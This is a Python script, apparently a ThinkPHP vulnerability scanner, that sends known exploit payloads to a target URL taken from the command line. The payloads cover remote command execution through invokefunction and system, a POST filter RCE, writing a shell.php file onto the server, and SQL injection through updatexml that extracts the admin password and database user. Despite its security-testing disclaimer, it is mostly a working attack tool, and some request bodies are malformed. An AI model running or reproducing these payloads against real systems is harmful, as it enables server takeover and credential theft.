#coding:utf-8
#date:2021-02-17
import sys
import requests
import urllib
import time

def tp5(name):
    url=name+"index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami"
    try:
        respnose=requests.get(url)#返回内容
        if respnose.status_code==200:
            print('可能存在tp5.1版本代码执行漏洞exp:index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami')
    except:
        time.sleep(0.5)

    url1=name+"index.php?s=captcha"
    head={
        "_method = __construct & filter[] = system & method = get & get[] = whoami"
    }
    try:
        postshell=requests.post(url1,data=head)
        if postshell.status_code==200:
            print('存在tp5.0版本post命令执行,可在上边head中修改whoami执行命令')
    except:
        time.sleep(0.5)
    head1={
        "_method = __construct & filter[] = system & method = get & server[REQUEST_METHOD] = whoami"
    }
    try:
        postshell2=requests.post(url1,data=head1)
        if postshell2.status_code==200:
            print('可能存在tp5.0.0-5.023命令执行')
    except:
        time.sleep(0.5)
    #下边是代码执行exp
    url2 = name + "public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
    try:
        daima = requests.get(url2)
        if daima.status_code==200:
            print('存在代码执行')
    except:
        time.sleep(0.5)
    #5.1版本
    u51=name+"index.php?s=index/think\request/input?data[]=phpinfo()&filter=assert"
    try:
        j51=requests.get(u51)
        if j51.status_code==200:
            print('存在tp5.1版本命令执行')
    except:
        time.sleep(0.5)

    #5.1x
    u51x=name+"index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
    try:
        j51x=requests.get(u51x)
        if j51x.status_code==200:
            print('存在tp5.1版本命令执行')
    except:
        time.sleep(0.5)

    #5.0
    u50=name+"index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
    try:
        j50=requests.get(u50)
        if j50.status_code==200:
            print('存在tp5.0版本命令执行')
    except:
        time.sleep(0.5)
    #写shell
    xie=name+"public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo '<?php phpinfo();?>' >>shell.php"
    try:
        xieshell=requests.get(xie)
        if xieshell.status_code==200:
            print('可能写入成功默认写入为phpinfo名称shell.php\n请手工查看')
    except:
        time.sleep(0.5)
def tp3(name):
    strin = time.strftime('%Y-%m-%d', time.localtime(time.time()))
    url=name+"?a=display&templateFile=data/runtime/Logs/Portal/'+strin+'.log"
    try:
        urls=requests.get(url)
        if urls.status_code==200:
            print('可能存在tp3日志缓存漏洞')
    except:
        time.sleep(0.5)
    #任意文件读取
    duqu=name+"?a=display&templateFile=index.php"
    try:
        duqus=requests.get(duqu)
        if duqus.status_code==200:
            print('存在tp3任意文件读取漏洞')
    except:
        time.sleep(0.5)
    #管理员exp
    guanli=name+"index.php?id[0]=exp&id[1]==1 or sleep(5)"
    try:
        guanliyuan=requests.get(guanli)
        if guanliyuan.status_code==200:
            print('存在tp3.23通杀管理员漏洞详情如下:')
            guanliyuan.encoding="utf-8"
            print(guanliyuan.text)
    except:
        time.sleep(0.5)
    #注入exp
    admin=name+"index.php?username=admin&password=123&id[0]=bind&id[1]=1%20and%20updatexml(1,concat(0x7,(select%20password%20from%20admin%20limit%201),0x7e),1)"
    try:
        password=requests.get(admin)
        if password.status_code==200:
            print('存在tp3.23通杀管理员漏洞详情如下:')
            password.encoding="utf-8"
            print(password.text)
    except:
        time.sleep(0.5)
    #database
    data=name+"Index/readcategorymsg?category[0]=bind&category[1]=0 and(updatexml(1,concat(0x7e,(user())),0))"
    try:
        database=requests.get(data)
        if database.status_code==200:
            print('存在tp3.2.3注入exp:Index/readcategorymsg?category[0]=bind&category[1]=0 and(updatexml(1,concat(0x7e,(user())),0))')
            database.encoding="utf-8"
            print(database.text)
    except:
        time.sleep(0.5)
    #database1
    datas=name+"Home/Index/readcategorymsg?category[0]=bind&category[1]=0 and(updatexml(1,concat(0x7e,(user())),0))"
    try:
        dataword=requests.get(datas)
        if dataword.status_code==200:
            print('可能存在tp3注入exp：Home/Index/readcategorymsg?category[0]=bind&category[1]=0 and(updatexml(1,concat(0x7e,(user())),0))')
            dataword.encoding="utf-8"
            print(dataword.text)
    except:
        time.sleep(0.5)
    #注入1
    zhuru=name+"index.php?m=Home&c=Index&a=test&id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--"
    try:
        zhuruword=requests.get(zhuru)
        if zhuruword.status_code==200:
            print('可能存在3.2.3注入exp：index.php?m=Home&c=Index&a=test&id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--')
            zhuruword.encoding="utf-8"
            print(zhuruword.text)
    except:
        time.sleep(0.5)
    #zhuru1
    zhuru1=name+"index.php?m=Home&c=Index&a=test&id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--"
    try:
        zword=requests.get(zhuru1)
        if zword.status_code==200:
            print('可能存在tp323注入exp：index.php?m=Home&c=Index&a=test&id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--')
            zword.encoding="utf-8"
            print(zword.text)
    except:
        time.sleep(0.5)
    # print("123123")

    #注入2
    zhuru2=name+"index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--"
    try:
        zhuru2word=requests.get(zhuru2)
        if zhuru2word.status_code==200:
            print('可能存在tp3.2.3注入expindex.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--')
            zhuru2word.encoding="utf-8"
            print(zhuru2word.text)
    except:
        time.sleep(0.5)
    print('没有检测到漏洞')
    #tp6
if __name__ == '__main__':

    try:

        print("  _______    _____                 \n" +
                " |__   __|  / ____|                \n" +
                "    | |_ __| (___   ___ __ _ _ __  \n" +
                "    | | '_ \\\\___ \\ / __/ _` | '_ \\ \n" +
                "    | | |_) |___) | (_| (_| | | | |\n" +
                "    |_| .__/_____/ \\___\\__,_|_| |_|\n" +
                "      | |                          \n" +
                "      |_|                          ")
        print('程序只用来安全检测使用本工具造成的一切后果自负')
        print('    tp6暂未添加如是thinkphp请自行测试')
        name=sys.argv[1]
        tp5(name)
        tp3(name)


    except Exception as e:
        print(sys.argv)
        print(e)